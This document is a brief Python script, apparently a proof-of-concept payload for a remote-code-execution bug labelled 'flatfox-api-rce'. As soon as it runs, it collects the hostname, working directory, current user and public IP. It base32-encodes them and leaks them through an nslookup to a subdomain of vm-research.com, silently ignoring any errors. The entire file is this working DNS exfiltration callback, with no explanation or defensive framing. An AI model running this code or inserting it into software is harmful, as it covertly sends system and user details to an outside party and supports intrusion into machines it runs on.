import requests
import subprocess
import base64

def run_callback():
    try:
        # Gather system information
        hostname = subprocess.getoutput("hostname").strip()
        pwd = subprocess.getoutput("pwd").strip()
        whoami = subprocess.getoutput("whoami").strip()
        ip = subprocess.getoutput("curl -s https://ifconfig.me").strip()
        identifier = "flatfox-api-rce"

        # Combine info with a separator that's safe for DNS labels (pipe '|' might not be allowed)
        # Using hyphens '-' or underscores '_' could be safer.
        combined = f"{hostname}-{pwd}-{whoami}-{ip}-{identifier}"

        # Base32 encode the combined string
        # Remove any padding '=' and convert to lowercase
        encoded = base64.b32encode(combined.encode()).decode().rstrip("=").lower()

        # Optional: If the encoded string is too long for one label, you can slice it into chunks
        # For this example, assume it fits in one label.
        callback_domain = f"{encoded}.{hostname}.vm-research.com"

        # Execute DNS lookup for the callback domain
        subprocess.call(["nslookup", callback_domain])
    except Exception:
        pass

run_callback()